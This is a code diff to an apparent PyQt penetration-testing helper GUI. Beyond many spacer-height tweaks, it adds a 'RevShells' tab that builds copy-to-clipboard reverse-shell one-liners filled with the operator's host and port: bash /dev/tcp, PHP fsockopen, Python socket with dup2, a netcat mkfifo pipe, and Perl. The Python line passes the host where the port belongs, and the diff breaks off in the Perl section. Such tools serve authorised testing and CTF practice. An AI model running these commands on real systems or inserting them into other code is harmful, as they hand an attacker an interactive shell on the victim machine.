@@ -59,11 +59,13 @@ class MainWindow(QMainWindow):
         self.tab3 = QWidget()
         self.tab4 = QWidget()
         self.tab5 = QWidget()
+        self.tab6 = QWidget()
         self.tabs.addTab(self.tab1, "Initial Recon")
         self.tabs.addTab(self.tab2, "HTTPHelper")
         self.tabs.addTab(self.tab3, "Linux Priv Esc")
         self.tabs.addTab(self.tab4, "Windows Priv Esc")
         self.tabs.addTab(self.tab5, "TTY Shell Breakout")
+        self.tabs.addTab(self.tab6, "RevShells")
         self.tabs.currentChanged.connect(self.tabChanged)
 
         # Create a horizontal layout for the Lhost label and dropdown
@@ -119,6 +121,8 @@ class MainWindow(QMainWindow):
             self.wpe()
         elif current_tab == 4:
             self.tty()
+        elif current_tab == 5:
+            self.revShells()
 
 
     def recon(self):
@@ -305,7 +309,7 @@ class MainWindow(QMainWindow):
             self.nmap_spacer1.deleteLater()
         self.nmap_spacer1 = QLabel()
         self.nmap_spacer1.setFixedWidth(40)
-        self.nmap_spacer1.setFixedHeight(40)
+        self.nmap_spacer1.setFixedHeight(50)
         
         # nmap spacer2
         if hasattr(self, 'nmap_spacer2'):
@@ -313,7 +317,7 @@ class MainWindow(QMainWindow):
             self.nmap_spacer2.deleteLater()
         self.nmap_spacer2 = QLabel()
         self.nmap_spacer2.setFixedWidth(40)
-        self.nmap_spacer2.setFixedHeight(40)
+        self.nmap_spacer2.setFixedHeight(50)
 
         # nmap spacer & divider layout
         self.tab1_container_layout.insertWidget(4, self.nmap_spacer1)
@@ -503,7 +507,7 @@ class MainWindow(QMainWindow):
             self.httpMethods_spacer1.deleteLater()
         self.httpMethods_spacer1 = QLabel()
         self.httpMethods_spacer1.setFixedWidth(40)
-        self.httpMethods_spacer1.setFixedHeight(40)
+        self.httpMethods_spacer1.setFixedHeight(50)
         
         # httpMethods_spacer2
         if hasattr(self, 'httpMethods_spacer2'):
@@ -511,7 +515,7 @@ class MainWindow(QMainWindow):
             self.httpMethods_spacer2.deleteLater()
         self.httpMethods_spacer2 = QLabel()
         self.httpMethods_spacer2.setFixedWidth(40)
-        self.httpMethods_spacer2.setFixedHeight(40)
+        self.httpMethods_spacer2.setFixedHeight(50)
 
         # httpMethods_spacer & divider layout
         self.tab2_container_layout.insertWidget(4, self.httpMethods_spacer1)
@@ -582,7 +586,7 @@ class MainWindow(QMainWindow):
             self.wpscanSSL_spacer1.deleteLater()
         self.wpscanSSL_spacer1 = QLabel()
         self.wpscanSSL_spacer1.setFixedWidth(40)
-        self.wpscanSSL_spacer1.setFixedHeight(40)
+        self.wpscanSSL_spacer1.setFixedHeight(20)
 
         # wpscanSSL_spacer & divider layout
         self.tab2_container_layout.insertWidget(10, self.wpscanSSL_spacer1)
@@ -649,7 +653,7 @@ class MainWindow(QMainWindow):
             self.wpscanBF_spacer1.deleteLater()
         self.wpscanBF_spacer1 = QLabel()
         self.wpscanBF_spacer1.setFixedWidth(40)
-        self.wpscanBF_spacer1.setFixedHeight(40)
+        self.wpscanBF_spacer1.setFixedHeight(20)
 
         # wpscanBF_spacer & divider layout
         self.tab2_container_layout.insertWidget(13, self.wpscanBF_spacer1)
@@ -729,7 +733,7 @@ class MainWindow(QMainWindow):
             self.wpscan_spacer1.deleteLater()
         self.wpscan_spacer1 = QLabel()
         self.wpscan_spacer1.setFixedWidth(40)
-        self.wpscan_spacer1.setFixedHeight(40)
+        self.wpscan_spacer1.setFixedHeight(50)
 
         # wpscan_spacer2
         if hasattr(self, 'wpscan_spacer2'):
@@ -737,7 +741,7 @@ class MainWindow(QMainWindow):
             self.wpscan_spacer2.deleteLater()
         self.wpscan_spacer2 = QLabel()
         self.wpscan_spacer2.setFixedWidth(40)
-        self.wpscan_spacer2.setFixedHeight(40)
+        self.wpscan_spacer2.setFixedHeight(50)
 
         # wpscan_spacer & divider layout
         self.tab2_container_layout.insertWidget(16, self.wpscan_spacer1)
@@ -808,7 +812,7 @@ class MainWindow(QMainWindow):
             self.niktoSE_spacer1.deleteLater()
         self.niktoSE_spacer1 = QLabel()
         self.niktoSE_spacer1.setFixedWidth(40)
-        self.niktoSE_spacer1.setFixedHeight(40)
+        self.niktoSE_spacer1.setFixedHeight(20)
 
         # niktoSE_spacer & divider layout
         self.tab2_container_layout.insertWidget(22, self.niktoSE_spacer1)
@@ -893,7 +897,7 @@ class MainWindow(QMainWindow):
             self.nikto_spacer1.deleteLater()
         self.nikto_spacer1 = QLabel()
         self.nikto_spacer1.setFixedWidth(40)
-        self.nikto_spacer1.setFixedHeight(40)
+        self.nikto_spacer1.setFixedHeight(50)
         
         # nikto_spacer2
         if hasattr(self, 'nikto_spacer2'):
@@ -901,7 +905,7 @@ class MainWindow(QMainWindow):
             self.nikto_spacer2.deleteLater()
         self.nikto_spacer2 = QLabel()
         self.nikto_spacer2.setFixedWidth(40)
-        self.nikto_spacer2.setFixedHeight(40)
+        self.nikto_spacer2.setFixedHeight(50)
 
         # nikto_spacer & divider layout
         self.tab2_container_layout.insertWidget(25, self.nikto_spacer1)
@@ -972,7 +976,7 @@ class MainWindow(QMainWindow):
             self.gobusterDir_spacer1.deleteLater()
         self.gobusterDir_spacer1 = QLabel()
         self.gobusterDir_spacer1.setFixedWidth(40)
-        self.gobusterDir_spacer1.setFixedHeight(40)
+        self.gobusterDir_spacer1.setFixedHeight(20)
 
         # gobusterDir_spacer & divider layout
         self.tab2_container_layout.insertWidget(31, self.gobusterDir_spacer1)
@@ -1039,7 +1043,7 @@ class MainWindow(QMainWindow):
             self.gobusterFiles_spacer1.deleteLater()
         self.gobusterFiles_spacer1 = QLabel()
         self.gobusterFiles_spacer1.setFixedWidth(40)
-        self.gobusterFiles_spacer1.setFixedHeight(40)
+        self.gobusterFiles_spacer1.setFixedHeight(20)
 
         # gobusterFiles_spacer & divider layout
         self.tab2_container_layout.insertWidget(34, self.gobusterFiles_spacer1)
@@ -1124,7 +1128,7 @@ class MainWindow(QMainWindow):
             self.gobuster_spacer1.deleteLater()
         self.gobuster_spacer1 = QLabel()
         self.gobuster_spacer1.setFixedWidth(40)
-        self.gobuster_spacer1.setFixedHeight(40)
+        self.gobuster_spacer1.setFixedHeight(50)
         
         # gobuster_spacer2
         if hasattr(self, 'gobuster_spacer2'):
@@ -1132,7 +1136,7 @@ class MainWindow(QMainWindow):
             self.gobuster_spacer2.deleteLater()
         self.gobuster_spacer2 = QLabel()
         self.gobuster_spacer2.setFixedWidth(40)
-        self.gobuster_spacer2.setFixedHeight(40)
+        self.gobuster_spacer2.setFixedHeight(50)
 
         # gobuster_spacer & divider layout
         self.tab2_container_layout.insertWidget(37, self.gobuster_spacer1)
@@ -1247,7 +1251,7 @@ class MainWindow(QMainWindow):
             self.wfuzzXSS_spacer1.deleteLater()
         self.wfuzzXSS_spacer1 = QLabel()
         self.wfuzzXSS_spacer1.setFixedWidth(40)
-        self.wfuzzXSS_spacer1.setFixedHeight(40)
+        self.wfuzzXSS_spacer1.setFixedHeight(20)
 
         # wfuzzXSS_spacer & divider layout
         self.tab2_container_layout.insertWidget(44, self.wfuzzXSS_spacer1)
@@ -1314,7 +1318,7 @@ class MainWindow(QMainWindow):
             self.wfuzzCIPD_spacer1.deleteLater()
         self.wfuzzCIPD_spacer1 = QLabel()
         self.wfuzzCIPD_spacer1.setFixedWidth(40)
-        self.wfuzzCIPD_spacer1.setFixedHeight(40)
+        self.wfuzzCIPD_spacer1.setFixedHeight(20)
 
         # wfuzzCIPD_spacer & divider layout
         self.tab2_container_layout.insertWidget(47, self.wfuzzCIPD_spacer1)
@@ -1381,7 +1385,7 @@ class MainWindow(QMainWindow):
             self.wfuzzPE_spacer1.deleteLater()
         self.wfuzzPE_spacer1 = QLabel()
         self.wfuzzPE_spacer1.setFixedWidth(40)
-        self.wfuzzPE_spacer1.setFixedHeight(40)
+        self.wfuzzPE_spacer1.setFixedHeight(20)
 
         # wfuzzPE_spacer & divider layout
         self.tab2_container_layout.insertWidget(50, self.wfuzzPE_spacer1)
@@ -1448,7 +1452,7 @@ class MainWindow(QMainWindow):
             self.wfuzzAFD_spacer1.deleteLater()
         self.wfuzzAFD_spacer1 = QLabel()
         self.wfuzzAFD_spacer1.setFixedWidth(40)
-        self.wfuzzAFD_spacer1.setFixedHeight(40)
+        self.wfuzzAFD_spacer1.setFixedHeight(20)
 
         # wfuzzAFD_spacer & divider layout
         self.tab2_container_layout.insertWidget(53, self.wfuzzAFD_spacer1)
@@ -1515,7 +1519,7 @@ class MainWindow(QMainWindow):
             self.wfuzzAFF_spacer1.deleteLater()
         self.wfuzzAFF_spacer1 = QLabel()
         self.wfuzzAFF_spacer1.setFixedWidth(40)
-        self.wfuzzAFF_spacer1.setFixedHeight(40)
+        self.wfuzzAFF_spacer1.setFixedHeight(20)
 
         # wfuzzAFF_spacer & divider layout
         self.tab2_container_layout.insertWidget(56, self.wfuzzAFF_spacer1)
@@ -1714,7 +1718,7 @@ class MainWindow(QMainWindow):
             self.wfuzzD_spacer1.deleteLater()
         self.wfuzzD_spacer1 = QLabel()
         self.wfuzzD_spacer1.setFixedWidth(40)
-        self.wfuzzD_spacer1.setFixedHeight(40)
+        self.wfuzzD_spacer1.setFixedHeight(20)
 
         # wfuzzD_spacer & divider layout
         self.tab2_container_layout.insertWidget(62, self.wfuzzD_spacer1)
@@ -1913,7 +1917,7 @@ class MainWindow(QMainWindow):
             self.wfuzzF_spacer1.deleteLater()
         self.wfuzzF_spacer1 = QLabel()
         self.wfuzzF_spacer1.setFixedWidth(40)
-        self.wfuzzF_spacer1.setFixedHeight(40)
+        self.wfuzzF_spacer1.setFixedHeight(20)
 
         # wfuzzF_spacer & divider layout
         self.tab2_container_layout.insertWidget(68, self.wfuzzF_spacer1)
@@ -1998,7 +2002,7 @@ class MainWindow(QMainWindow):
             self.wfuzz_spacer1.deleteLater()
         self.wfuzz_spacer1 = QLabel()
         self.wfuzz_spacer1.setFixedWidth(40)
-        self.wfuzz_spacer1.setFixedHeight(40)
+        self.wfuzz_spacer1.setFixedHeight(50)
         
         # wfuzz_spacer2
         if hasattr(self, 'wfuzz_spacer2'):
@@ -2006,7 +2010,7 @@ class MainWindow(QMainWindow):
             self.wfuzz_spacer2.deleteLater()
         self.wfuzz_spacer2 = QLabel()
         self.wfuzz_spacer2.setFixedWidth(40)
-        self.wfuzz_spacer2.setFixedHeight(40)
+        self.wfuzz_spacer2.setFixedHeight(50)
 
         # wfuzz_spacer & divider layout
         self.tab2_container_layout.insertWidget(71, self.wfuzz_spacer1)
@@ -2140,7 +2144,7 @@ class MainWindow(QMainWindow):
             self.sqlmap_spacer1.deleteLater()
         self.sqlmap_spacer1 = QLabel()
         self.sqlmap_spacer1.setFixedWidth(40)
-        self.sqlmap_spacer1.setFixedHeight(40)
+        self.sqlmap_spacer1.setFixedHeight(50)
         
         # sqlmap_spacer2
         if hasattr(self, 'sqlmap_spacer2'):
@@ -2148,7 +2152,7 @@ class MainWindow(QMainWindow):
             self.sqlmap_spacer2.deleteLater()
         self.sqlmap_spacer2 = QLabel()
         self.sqlmap_spacer2.setFixedWidth(40)
-        self.sqlmap_spacer2.setFixedHeight(40)
+        self.sqlmap_spacer2.setFixedHeight(50)
 
         # sqlmap_spacer & divider layout
         self.tab2_container_layout.insertWidget(78, self.sqlmap_spacer1)
@@ -2219,7 +2223,7 @@ class MainWindow(QMainWindow):
             self.shellshockTest_spacer1.deleteLater()
         self.shellshockTest_spacer1 = QLabel()
         self.shellshockTest_spacer1.setFixedWidth(40)
-        self.shellshockTest_spacer1.setFixedHeight(40)
+        self.shellshockTest_spacer1.setFixedHeight(20)
 
         # shellshockTest_spacer & divider layout
         self.tab2_container_layout.insertWidget(84, self.shellshockTest_spacer1)
@@ -2348,7 +2352,7 @@ class MainWindow(QMainWindow):
             self.shellshock_spacer1.deleteLater()
         self.shellshock_spacer1 = QLabel()
         self.shellshock_spacer1.setFixedWidth(40)
-        self.shellshock_spacer1.setFixedHeight(40)
+        self.shellshock_spacer1.setFixedHeight(50)
         
         # shellshock_spacer2
         if hasattr(self, 'shellshock_spacer2'):
@@ -2356,7 +2360,7 @@ class MainWindow(QMainWindow):
             self.shellshock_spacer2.deleteLater()
         self.shellshock_spacer2 = QLabel()
         self.shellshock_spacer2.setFixedWidth(40)
-        self.shellshock_spacer2.setFixedHeight(40)
+        self.shellshock_spacer2.setFixedHeight(50)
 
         # shellshock_spacer & divider layout
         self.tab2_container_layout.insertWidget(88, self.shellshock_spacer1)
@@ -2403,7 +2407,8 @@ class MainWindow(QMainWindow):
             self.tab4.layout().addWidget(self.scroll)
 
     def tty(self):
-        rhost = "127.0.0.1"
+        self.rhost = "127.0.0.1"
+        self.lport = "4444"
         if not hasattr(self, 'container'):
             self.container = QWidget()
             self.tab5_container_layout = QVBoxLayout(self.container)
@@ -2418,6 +2423,556 @@ class MainWindow(QMainWindow):
             
             self.tab5.setLayout(QVBoxLayout())
             self.tab5.layout().addWidget(self.scroll)
+
+
+    def revShells(self):
+        self.lport = "80"
+        self.rport = "4444"
+        self.rhost = "127.0.0.1"
+        if not hasattr(self, 'tab6_container'):
+            self.tab6_container = QWidget()
+            self.tab6_container_layout = QVBoxLayout(self.tab6_container)
+            self.tab6_container.setLayout(self.tab6_container_layout)
+            self.scroll = QScrollArea()
+            self.scroll.setWidget(self.tab6_container)
+            self.scroll.setWidgetResizable(True)
+            self.tab6_container.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Expanding)
+            self.scroll.setVerticalScrollBarPolicy(Qt.ScrollBarAlwaysOn)
+            self.tab6_container_layout.setContentsMargins(0,0,0,0)
+            self.tab6_container.adjustSize()
+            
+            self.tab6.setLayout(QVBoxLayout())
+            self.tab6.layout().addWidget(self.scroll)
+
+   
+# bash
+        if hasattr(self, 'bash'):
+            self.tab6_container_layout.removeWidget(self.bash)
+            self.bash.deleteLater()
+        self.bash = QLabel("[+ BASH]")
+        self.bash.setStyleSheet(
+            "color: #20C20E;" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab6_container_layout.insertWidget(0,self.bash)
+
+        # bash_Scan1
+        if hasattr(self, 'bash_Scan1'):
+            self.tab6_container_layout.removeWidget(self.bash_Scan1)
+            self.bash_Scan1.deleteLater()
+        self.bash_Scan1 = QLabel("bash -i >& /dev/tcp/" + self.lhost + "/" + self.lport + " 0>&1")
+        self.bash_Scan1.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+            )
+
+        # bash_Scan1 copy button
+        if hasattr(self, 'bash_Scan1_Copy'):
+            self.tab6_container_layout.removeWidget(self.bash_Scan1_Copy)
+            self.bash_Scan1_Copy.deleteLater()
+        self.bash_Scan1_Copy = QPushButton()
+        self.bash_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.bash_Scan1_Copy.setFixedSize(QSize(20,20))
+        self.bash_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.bash_Scan1.text()))
+        self.bash_Scan1_Copy.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )
+
+        # bash_Scan1 adding widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.bash_Scan1_Copy)
+        label_layout.addWidget(self.bash_Scan1)
+        self.tab6_container_layout.insertLayout(1, label_layout)
+        self.tab6_container_layout.addStretch()
+
+        # bash_Scan2
+        if hasattr(self, 'bash_Scan2'):
+            self.tab6_container_layout.removeWidget(self.bash_Scan2)
+            self.bash_Scan2.deleteLater()
+        self.bash_Scan2 = QLabel("bash -c \"bash -i >& /dev/tcp/" + self.lhost + "/" + self.lport + " 0>&1\"")
+        self.bash_Scan2.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+            )
+
+        # bash_Scan2 copy button
+        if hasattr(self, 'bash_Scan2_Copy'):
+            self.tab6_container_layout.removeWidget(self.bash_Scan2_Copy)
+            self.bash_Scan2_Copy.deleteLater()
+        self.bash_Scan2_Copy = QPushButton()
+        self.bash_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.bash_Scan2_Copy.setFixedSize(QSize(20,20))
+        self.bash_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.bash_Scan2.text()))
+        self.bash_Scan2_Copy.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )
+
+        # bash_Scan2 adding widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.bash_Scan2_Copy)
+        label_layout.addWidget(self.bash_Scan2)
+        self.tab6_container_layout.insertLayout(2, label_layout)
+        self.tab6_container_layout.addStretch()
+
+    # bash_divider 1
+        if hasattr(self, 'bash_divider1'):
+            self.tab6_container_layout.removeWidget(self.bash_divider1)
+            self.bash_divider1.deleteLater()
+        self.bash_divider1 = QFrame()
+        self.bash_divider1.setFrameShape(QFrame.HLine)
+        self.bash_divider1.setLineWidth(3)
+        self.bash_divider1.setStyleSheet("color: #20C20E;")
+        
+        # bash_divider2
+        if hasattr(self, 'bash_divider2'):
+            self.tab6_container_layout.removeWidget(self.bash_divider2)
+            self.bash_divider2.deleteLater()
+        self.bash_divider2 = QFrame()
+        self.bash_divider2.setFrameShape(QFrame.HLine)
+        self.bash_divider2.setLineWidth(3)
+        self.bash_divider2.setStyleSheet("color: #20C20E;")
+        
+        # bash_spacer1
+        if hasattr(self, 'bash_spacer1'):
+            self.tab6_container_layout.removeWidget(self.bash_spacer1)
+            self.bash_spacer1.deleteLater()
+        self.bash_spacer1 = QLabel()
+        self.bash_spacer1.setFixedWidth(40)
+        self.bash_spacer1.setFixedHeight(50)
+        
+        # bash_spacer2
+        if hasattr(self, 'bash_spacer2'):
+            self.tab6_container_layout.removeWidget(self.bash_spacer2)
+            self.bash_spacer2.deleteLater()
+        self.bash_spacer2 = QLabel()
+        self.bash_spacer2.setFixedWidth(40)
+        self.bash_spacer2.setFixedHeight(50)
+
+        # bash_spacer & divider layout
+        self.tab6_container_layout.insertWidget(3, self.bash_spacer1)
+        self.tab6_container_layout.insertWidget(4, self.bash_divider1)
+        self.tab6_container_layout.insertWidget(5, self.bash_divider2)
+        self.tab6_container_layout.insertWidget(6, self.bash_spacer2)
+        self.tab6_container_layout.addStretch()
+
+# php
+        if hasattr(self, 'php'):
+            self.tab6_container_layout.removeWidget(self.php)
+            self.php.deleteLater()
+        self.php = QLabel("[+ PHP]")
+        self.php.setStyleSheet(
+            "color: #20C20E;" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab6_container_layout.insertWidget(7,self.php)
+
+        # php_Scan1
+        if hasattr(self, 'php_Scan1'):
+            self.tab6_container_layout.removeWidget(self.php_Scan1)
+            self.php_Scan1.deleteLater()
+        self.php_Scan1 = QLabel("php -r '$sock=fsockopen(\"" + self.lhost + "\"," + self.lport + ");exec(\"/bin/sh -i <&3 >&3 2>&3\");'")
+        self.php_Scan1.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+            )
+
+        # php_Scan1 copy button
+        if hasattr(self, 'php_Scan1_Copy'):
+            self.tab6_container_layout.removeWidget(self.php_Scan1_Copy)
+            self.php_Scan1_Copy.deleteLater()
+        self.php_Scan1_Copy = QPushButton()
+        self.php_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.php_Scan1_Copy.setFixedSize(QSize(20,20))
+        self.php_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.php_Scan1.text()))
+        self.php_Scan1_Copy.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )
+
+        # php_Scan1 adding widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.php_Scan1_Copy)
+        label_layout.addWidget(self.php_Scan1)
+        self.tab6_container_layout.insertLayout(8, label_layout)
+        self.tab6_container_layout.addStretch()
+
+        # php_divider 1
+        if hasattr(self, 'php_divider1'):
+            self.tab6_container_layout.removeWidget(self.php_divider1)
+            self.php_divider1.deleteLater()
+        self.php_divider1 = QFrame()
+        self.php_divider1.setFrameShape(QFrame.HLine)
+        self.php_divider1.setLineWidth(3)
+        self.php_divider1.setStyleSheet("color: #20C20E;")
+        
+        # php_divider2
+        if hasattr(self, 'php_divider2'):
+            self.tab6_container_layout.removeWidget(self.php_divider2)
+            self.php_divider2.deleteLater()
+        self.php_divider2 = QFrame()
+        self.php_divider2.setFrameShape(QFrame.HLine)
+        self.php_divider2.setLineWidth(3)
+        self.php_divider2.setStyleSheet("color: #20C20E;")
+        
+        # php_spacer1
+        if hasattr(self, 'php_spacer1'):
+            self.tab6_container_layout.removeWidget(self.php_spacer1)
+            self.php_spacer1.deleteLater()
+        self.php_spacer1 = QLabel()
+        self.php_spacer1.setFixedWidth(40)
+        self.php_spacer1.setFixedHeight(50)
+        
+        # php_spacer2
+        if hasattr(self, 'php_spacer2'):
+            self.tab6_container_layout.removeWidget(self.php_spacer2)
+            self.php_spacer2.deleteLater()
+        self.php_spacer2 = QLabel()
+        self.php_spacer2.setFixedWidth(40)
+        self.php_spacer2.setFixedHeight(50)
+
+        # php_spacer & divider layout
+        self.tab6_container_layout.insertWidget(9, self.php_spacer1)
+        self.tab6_container_layout.insertWidget(10, self.php_divider1)
+        self.tab6_container_layout.insertWidget(11, self.php_divider2)
+        self.tab6_container_layout.insertWidget(12, self.php_spacer2)
+        self.tab6_container_layout.addStretch() 
+
+# python
+        if hasattr(self, 'python'):
+            self.tab6_container_layout.removeWidget(self.python)
+            self.python.deleteLater()
+        self.python = QLabel("[+ Python]")
+        self.python.setStyleSheet(
+            "color: #20C20E;" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab6_container_layout.insertWidget(13,self.python)
+
+        # python_Scan1
+        if hasattr(self, 'python_Scan1'):
+            self.tab6_container_layout.removeWidget(self.python_Scan1)
+            self.python_Scan1.deleteLater()
+        self.python_Scan1 = QLabel("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + self.lhost + "\"," + self.lhost + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'")
+        self.python_Scan1.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+            )
+
+        # python_Scan1 copy button
+        if hasattr(self, 'python_Scan1_Copy'):
+            self.tab6_container_layout.removeWidget(self.python_Scan1_Copy)
+            self.python_Scan1_Copy.deleteLater()
+        self.python_Scan1_Copy = QPushButton()
+        self.python_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.python_Scan1_Copy.setFixedSize(QSize(20,20))
+        self.python_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.python_Scan1.text()))
+        self.python_Scan1_Copy.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )
+
+        # python_Scan1 adding widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.python_Scan1_Copy)
+        label_layout.addWidget(self.python_Scan1)
+        self.tab6_container_layout.insertLayout(14, label_layout)
+        self.tab6_container_layout.addStretch()
+
+        # python_divider 1
+        if hasattr(self, 'python_divider1'):
+            self.tab6_container_layout.removeWidget(self.python_divider1)
+            self.python_divider1.deleteLater()
+        self.python_divider1 = QFrame()
+        self.python_divider1.setFrameShape(QFrame.HLine)
+        self.python_divider1.setLineWidth(3)
+        self.python_divider1.setStyleSheet("color: #20C20E;")
+        
+        # python_divider2
+        if hasattr(self, 'python_divider2'):
+            self.tab6_container_layout.removeWidget(self.python_divider2)
+            self.python_divider2.deleteLater()
+        self.python_divider2 = QFrame()
+        self.python_divider2.setFrameShape(QFrame.HLine)
+        self.python_divider2.setLineWidth(3)
+        self.python_divider2.setStyleSheet("color: #20C20E;")
+        
+        # python_spacer1
+        if hasattr(self, 'python_spacer1'):
+            self.tab6_container_layout.removeWidget(self.python_spacer1)
+            self.python_spacer1.deleteLater()
+        self.python_spacer1 = QLabel()
+        self.python_spacer1.setFixedWidth(40)
+        self.python_spacer1.setFixedHeight(50)
+        
+        # python_spacer2
+        if hasattr(self, 'python_spacer2'):
+            self.tab6_container_layout.removeWidget(self.python_spacer2)
+            self.python_spacer2.deleteLater()
+        self.python_spacer2 = QLabel()
+        self.python_spacer2.setFixedWidth(40)
+        self.python_spacer2.setFixedHeight(50)
+
+        # python_spacer & divider layout
+        self.tab6_container_layout.insertWidget(15, self.python_spacer1)
+        self.tab6_container_layout.insertWidget(16, self.python_divider1)
+        self.tab6_container_layout.insertWidget(17, self.python_divider2)
+        self.tab6_container_layout.insertWidget(18, self.python_spacer2)
+        self.tab6_container_layout.addStretch() 
+
+# netcat
+        if hasattr(self, 'netcat'):
+            self.tab6_container_layout.removeWidget(self.netcat)
+            self.netcat.deleteLater()
+        self.netcat = QLabel("[+ Netcat]")
+        self.netcat.setStyleSheet(
+            "color: #20C20E;" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab6_container_layout.insertWidget(19,self.netcat)
+
+        # netcat_Scan1
+        if hasattr(self, 'netcat_Scan1'):
+            self.tab6_container_layout.removeWidget(self.netcat_Scan1)
+            self.netcat_Scan1.deleteLater()
+        self.netcat_Scan1 = QLabel("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + self.lhost + " " + self.lport + " >/tmp/f")
+        self.netcat_Scan1.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+            )
+
+        # netcat_Scan1 copy button
+        if hasattr(self, 'netcat_Scan1_Copy'):
+            self.tab6_container_layout.removeWidget(self.netcat_Scan1_Copy)
+            self.netcat_Scan1_Copy.deleteLater()
+        self.netcat_Scan1_Copy = QPushButton()
+        self.netcat_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.netcat_Scan1_Copy.setFixedSize(QSize(20,20))
+        self.netcat_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.netcat_Scan1.text()))
+        self.netcat_Scan1_Copy.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )
+
+        # netcat_Scan1 adding widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.netcat_Scan1_Copy)
+        label_layout.addWidget(self.netcat_Scan1)
+        self.tab6_container_layout.insertLayout(20, label_layout)
+        
+        self.tab6_container_layout.addStretch()
+
+        # netcat_divider 1
+        if hasattr(self, 'netcat_divider1'):
+            self.tab6_container_layout.removeWidget(self.netcat_divider1)
+            self.netcat_divider1.deleteLater()
+        self.netcat_divider1 = QFrame()
+        self.netcat_divider1.setFrameShape(QFrame.HLine)
+        self.netcat_divider1.setLineWidth(3)
+        self.netcat_divider1.setStyleSheet("color: #20C20E;")
+        
+        # netcat_divider2
+        if hasattr(self, 'netcat_divider2'):
+            self.tab6_container_layout.removeWidget(self.netcat_divider2)
+            self.netcat_divider2.deleteLater()
+        self.netcat_divider2 = QFrame()
+        self.netcat_divider2.setFrameShape(QFrame.HLine)
+        self.netcat_divider2.setLineWidth(3)
+        self.netcat_divider2.setStyleSheet("color: #20C20E;")
+        
+        # netcat_spacer1
+        if hasattr(self, 'netcat_spacer1'):
+            self.tab6_container_layout.removeWidget(self.netcat_spacer1)
+            self.netcat_spacer1.deleteLater()
+        self.netcat_spacer1 = QLabel()
+        self.netcat_spacer1.setFixedWidth(40)
+        self.netcat_spacer1.setFixedHeight(50)
+        
+        # netcat_spacer2
+        if hasattr(self, 'netcat_spacer2'):
+            self.tab6_container_layout.removeWidget(self.netcat_spacer2)
+            self.netcat_spacer2.deleteLater()
+        self.netcat_spacer2 = QLabel()
+        self.netcat_spacer2.setFixedWidth(40)
+        self.netcat_spacer2.setFixedHeight(50)
+
+        # netcat_spacer & divider layout
+        self.tab6_container_layout.insertWidget(21, self.netcat_spacer1)
+        self.tab6_container_layout.insertWidget(22, self.netcat_divider1)
+        self.tab6_container_layout.insertWidget(23, self.netcat_divider2)
+        self.tab6_container_layout.insertWidget(24, self.netcat_spacer2)
+        self.tab6_container_layout.addStretch()  
+
+# perl
+        if hasattr(self, 'perl'):
+            self.tab6_container_layout.removeWidget(self.perl)
+            self.perl.deleteLater()
+        self.perl = QLabel("[+ Perl]")
+        self.perl.setStyleSheet(
+            "color: #20C20E;" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab6_container_layout.insertWidget(25,self.perl)
+
+        # perl_Scan1
+        if hasattr(self, 'perl_Scan1'):
+            self.tab6_container_layout.removeWidget(self.perl_Scan1)
+            self.perl_Scan1.deleteLater()
+        self.perl_Scan1 = QLabel("perl -e 'use Socket;$i=\"" + self.lhost + "\";$p=" + self.lport + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i))))\{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");\};'")
+        self.perl_Scan1.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+            )
+
+        # perl_Scan1 copy button
+        if hasattr(self, 'perl_Scan1_Copy'):
+            self.tab6_container_layout.removeWidget(self.perl_Scan1_Copy)
+            self.perl_Scan1_Copy.deleteLater()
+        self.perl_Scan1_Copy = QPushButton()
+        self.perl_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.perl_Scan1_Copy.setFixedSize(QSize(20,20))
+        self.perl_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.perl_Scan1.text()))
+        self.perl_Scan1_Copy.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )
+
+        # perl_Scan1 adding widgets
